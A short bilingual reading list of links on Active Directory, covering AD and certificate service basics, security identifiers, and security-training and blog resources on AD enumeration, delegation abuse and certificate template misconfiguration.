- [Introduction of Active Directory Domain Services](https://www.geeksforgeeks.org/introduction-of-active-directory-domain-services/)
- [實作和管理 Active Directory 憑證服務](https://learn.microsoft.com/zh-tw/training/modules/implement-manage-active-directory-certificate-services/)
- [HackTheBox introduction-to-active-directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory)
- [HackTheBox active-directory-enumeration--attacks](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [AD_attack_defend_cheatshee](https://github.com/idnahacks/AD_attack_defend_cheatsheet/blob/main/README.md)
- [安全性識別碼](https://learn.microsoft.com/zh-tw/windows-server/identity/ad-ds/manage/understand-security-identifiers)
- [exploiting-misconfigured-active-directory-certificate-template-esc1](https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/)